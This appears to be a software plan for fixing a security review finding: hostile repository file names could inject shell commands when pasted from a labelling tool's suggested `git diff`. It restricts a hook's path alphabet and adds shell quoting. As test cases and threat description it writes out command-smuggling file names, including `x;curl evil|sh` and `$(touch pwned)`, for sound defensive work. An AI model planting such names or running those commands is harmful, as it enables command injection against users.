# Keep shell metacharacters out of the paths of a handle, and quote what the labelling tool shows

Status: Proposed
Created: 2026-11-07
Candidate: none (a correction that follows from the Low 1 finding of the security review of the shadow hook handle, 2026-11-07)
Specs: action-review

## Goal

After this plan a handle holds only paths made of a conservative alphabet, and the labelling tool shows a path that has any other character quoted for a shell, so that a file name chosen by a hostile repository cannot become a command by being pasted into the `git diff -- <the paths>` that the tool suggests. The tool still runs nothing.

The finding: `plain_path` in `hook/shadow_hook.py` allows any printable ASCII, including `;`, `$(`, backticks, quotes, spaces and `|`. A repository the owner works in can track a file named like `x;curl evil|sh` and commit a fake secret so that the engine declines it; the handle then shows that name, and an owner who pastes it unquoted into the suggested `git diff` would run it. The terminal display is safe; the attacker needs a repository the owner works in and an unquoted paste. The reviewer rated it Low and recommended restricting the alphabet or quoting in the tool. This plan does both: the hook restricts the alphabet at the source, and the tool quotes, because handle rows already written by the installed hook may hold such names.

## Scope

- `packages/workbench/action-review/tools/label.py` and `tests/test_tools_label.py`: show a path outside the safe alphabet quoted for a shell, and say so.
- `packages/workbench/action-review/hook/shadow_hook.py` (`plain_path`), the pin of that file in `helper/action-review`, and `tests/test_hook_handle.py`: only the safe alphabet is a candidate.
- `docs/specs/action-review.md`: the handle shape bullet, the labelling-tool paragraph and the owner's labelling step.

## Non-goals

- The second Low finding (the 30 second budget can still be passed under lock contention with two writes plus the index read; the old code had the same exposure with 29 seconds of engine time). Recorded as deferred.
- The admission rule (the index), the index reader, the row shape, the caps, the report, and the residual risk that a staged file whose name is a secret is admitted.
- Any change to what the tool runs: it starts no program.
- Rewriting or removing handle rows already in the owner's store. The tool quotes what it shows; the rows stay as written.
- The Linux check of the `O_NOFOLLOW` walk, which the review could not make; the owner may ask for it separately.

## Assumptions and constraints

- The safe alphabet is `[A-Za-z0-9._/+@%,-]`: the security reviewer's suggestion without `=`, which a word may begin with in zsh to expand a command's path (`=ls`), a shell the project accounts for; the equality sign is therefore not in the alphabet at all. It contains no character that bash, zsh or a POSIX `sh` treat as syntax in an argument (`%` and `@` and `+` and `,` are plain in an argument; `~` and `{`, `}` are excluded) and no space. The existing rules stay: 1 to 256 characters, relative, no empty, `.` or `..` segment, no leading `-`. A path outside the alphabet is dropped and counted in `paths_dropped`, never changed. This is the agent's proposal; the characters can be widened by a later plan.
- In the tool, a path made only of the safe alphabet is shown as it is. Any other path made only of printable ASCII (0x20 to 0x7e) is shown by a formatter of the tool's own, always as one single-quoted word with each apostrophe written as the quote-break sequence `'"'"'`, and with no further escaping: the display cleaner of the tool doubles a backslash and would change what is pasted, so it is not applied to these. The formatter is not `shlex.quote`, which leaves `=`, `:` and a few other characters unquoted, so that `=ls` would still expand in zsh. A path with any control or non-ASCII character is shown as visible escapes inside quotes, followed by `[not for pasting]` (the hook no longer writes such a path, and an old row may hold one). A line says that paths are quoted where a shell would treat them as syntax. The `git diff -- <the paths>` hint keeps the literal `<the paths>` and never holds a path.
- The tool needs no new import: it imports only the standard library and `shadow_store`, and the formatter is a few lines of its own. The source tests that it starts no program and opens no file stay true.
- The increments are ordered so the tool is replaced first, as before: the tool can show an old unsafe row safely, the hook then stops writing them. The owner copies `label.py` after the release of increment A and `shadow_hook.py` after the release of increment B. The files in `~/action-review-shadow` are the owner's read-only copies.
- A package file changes in each increment: the release approvals, the removal of stale shipped records after the owner approves the list, the upgrade and the rerender are the owner's. Each increment is built and tested in a scratch clone and copied by the owner's script, as in the earlier plans. Nothing is pushed without the owner's word.
- A fix to a flaw gets a regression test that fails before the fix and passes after, and an independent second look (the `reviewer` agent). Tests are run with `python3 -I -B` on the module's tests; one test of the module, `test_hook_shadow_hook.Launcher.test_the_environment_holds_exactly_path_home_and_lang`, fails on the unchanged tree because of the environment the tests run in, and is not part of this plan.

## Completion criteria

1. The tool shows a printable path with a character outside the safe alphabet (a space, `;`, `|`, `$`, a backtick, `(`, `)`, `<`, `>`, `&`, `*`, `?`, `!`, `#`, `=`, `~`, `{`, `}`, a quote or a backslash) single-quoted, so that pasting it into a shell gives the same one argument and runs nothing; a path of the safe alphabet is shown unchanged; a path with a control or non-ASCII character is shown as visible escapes and marked not for pasting; nothing shown can drive the terminal.
2. A test that evaluates the shown text in `/bin/sh`, in `bash` and in `zsh -f` where they are installed, with a program that records its arguments (a fake `git`), finds exactly the paths and no other command run, for hostile names built from the characters above, a literal backslash and a leading `=` among them.
3. The hook keeps a path only if it is of the safe alphabet and meets the existing rules; a tracked file named with any other character is dropped and counted in `paths_dropped`; the three kinds of test of the earlier plan (hostile facts, hostile indexes, the row shape) still pass.
4. The spec states the alphabet, the tool's quoting, and that handle rows written before the restriction may hold other names and are quoted by the tool.
5. The module's tests pass apart from the one named above, `wb run code-work check` passes, and a security reviewer's Low 1 case (`$(touch pwned)` and `has space;x` as tracked names) is a test that failed before and passes after.

## Increments

### Increment A — The labelling tool quotes a path that a shell would read as syntax

**Outcome:** completion criteria 1, 2 and the tool part of 4 are true.
**Dependencies:** none.
**Affected areas:** `packages/workbench/action-review/tools/label.py`, `packages/workbench/action-review/tests/test_tools_label.py`, `docs/specs/action-review.md` (the labelling-tool paragraph for a handle and the owner's labelling step).
**Steps:**
1. Write the tests first, in a scratch clone: a path of the safe alphabet is shown unchanged; each hostile name (`a;b`, `$(touch pwned)`, `` `id` ``, `a b`, `a|b`, `a&b`, `a>b`, `a<b`, `it's`, `a"b`, `a\b` with one literal backslash, `a*b`, `a?b`, `a!b`, `a#b`, `~x`, `{a,b}`, `=ls`, `a=b`) is shown single-quoted; the shown text of every printable path, put on the command line of `/bin/sh -c`, `bash -c` and `zsh -f -c` (each where installed; a missing shell skips its case and says so) as `fake-git diff -- <shown paths>` with a fake `git` that records its arguments, gives exactly the original paths as arguments and starts nothing else (the test runs the shell; the tool does not); a path with control or non-ASCII characters is shown as visible escapes in quotes followed by `[not for pasting]` and nothing reaches the terminal raw; the `to judge it` line and the hint are unchanged except for one added sentence that names the quoting; the count of paths and their cut at 256 characters are as before. See them fail.
2. Add the formatter and use it in `show_handle` in `label.py`.
3. Edit the two places of the spec.
4. Run the verification below and ask the `reviewer` for a read.
**Verification:** `test_tools_label.py` and the rest of the `action-review` module suite; a mutation check of `label.py` (the quoting removed, a character left out of the safe alphabet, the quoting applied after the cleaning, the hint holding a path); `wb run code-work check`. Not run: the whole repository suite (no installer code changes).
**Evidence:** the one local commit, with the trailer `Plan: 2026-11-07-handle-paths-are-shell-safe#A`.

### Increment B — The hook keeps only paths of the safe alphabet

**Outcome:** completion criteria 3, 5 and the hook part of 4 are true.
**Dependencies:** A.
**Affected areas:** `packages/workbench/action-review/hook/shadow_hook.py` (`plain_path`), `packages/workbench/action-review/helper/action-review` (the pin of the hook), `packages/workbench/action-review/tests/test_hook_handle.py`, `docs/specs/action-review.md` (the handle shape bullet and the owner's labelling step).
**Steps:**
1. Write the tests first: each hostile name of increment A, tracked in a real repository and listed in the facts, is dropped and counted (`=ls` and `a=b` among them: the equality sign is not in the alphabet); `$(touch pwned)` and `has space;x` as tracked names are the regression test of the review's finding; each character of the safe alphabet is accepted in a tracked name; the existing rules (length, `..`, leading `-`, empty segments, non-ASCII) still reject; the hostile-facts test and the row shape test pass unchanged. See them fail.
2. Restrict `plain_path` to the alphabet. Update the pin of the hook in the helper and the pin test.
3. Edit the spec: the handle shape bullet states the alphabet and that rows written before it may hold other names, which the tool quotes.
4. Run the verification below and ask the `reviewer` for a read.
**Verification:** `test_hook_handle.py`, `test_hook_shadow_hook.py`, the pin test and the rest of the module suite; a mutation check of `plain_path` (a character added to the alphabet, the check dropped, a character class made too wide); `wb run code-work check`. After the copy and the release, `wb verify packages/workbench` shows the new tree hash for `action-review`. Not run: the whole repository suite, and the hook against a real engine and a real session.
**Evidence:** the one local commit, with the trailer `Plan: 2026-11-07-handle-paths-are-shell-safe#B`.

## Verification for the plan as a whole

The recorded verification of each increment stands unless a later one changed its inputs. After the last increment the module suite runs once and `wb run code-work check` runs. Whether a hostile name is now kept out in the owner's store is for the owner to see after replacing `label.py` and then `shadow_hook.py` in `~/action-review-shadow`.

## Risks and sensitive actions

- **The hook is user-level and runs for every project.** The change narrows what it keeps; it adds no new read. A mistake in the character class could drop honest paths (a path with a space or a `+` would be counted as left out) or let a bad one through; the tests list both.
- **Quoting is a display.** A path that the tool shows quoted is safe to paste. A path shown another way, or one the owner retypes, is not covered; the hint line keeps the literal `<the paths>`.
- **Old rows.** Handle rows written before increment B may hold names of the wider alphabet. The tool quotes them from increment A on; nothing rewrites them.
- **A package file changes in both increments:** the release approvals, the removal of stale shipped records after the owner approves the list, the upgrade and the rerender are the owner's. The copies in `~/action-review-shadow` are the owner's to replace. Nothing is pushed without the owner's word.
- A security review is not suggested again for this plan: the change narrows an alphabet and quotes a display. If the owner wants one, the surface is the character class and the quoting.

## Review record

Codex, plan review, 3 rounds of 3 (the bound); converged with no meaningful finding in round 3. Models: `gpt-5.6-terra` for rounds 1 and 2, `gpt-6.1-sol` for round 3.

- Applied (round 1, major): the display cleaner doubles a backslash, so a quoted printable path would not paste back as itself. A printable path is now shown as the quoted word with no further escaping; only paths with control or non-ASCII characters are escaped, and they are marked not for pasting; the round-trip test includes a literal backslash.
- Applied (round 1, major): a word that begins with `=` expands in zsh, and the alphabet had `=` in it. The equality sign is out of the alphabet; the round-trip test runs `sh`, `bash` and `zsh -f` where installed; `=ls` and `a=b` are cases.
- Applied (round 2, major): `shlex.quote` leaves `=` and `:` unquoted. The plan now specifies a formatter of the tool's own that returns a path unchanged only when it is of the alphabet and otherwise always emits one single-quoted word with the quote-break sequence for apostrophes.
- Rejected: none. Left for the owner: nothing from the review.

## Deferred work

- The second Low finding: the 30 second budget under lock contention. The old code had the same exposure; the owner may ask for a shorter lock wait or a skip of the handle after 20 seconds.
- The Linux check of the `O_NOFOLLOW` walk in `open_git_directory`.
- Widening the alphabet (a space, `~`) with quoting, if honest paths are found to be dropped.

## Result

Empty until work starts.
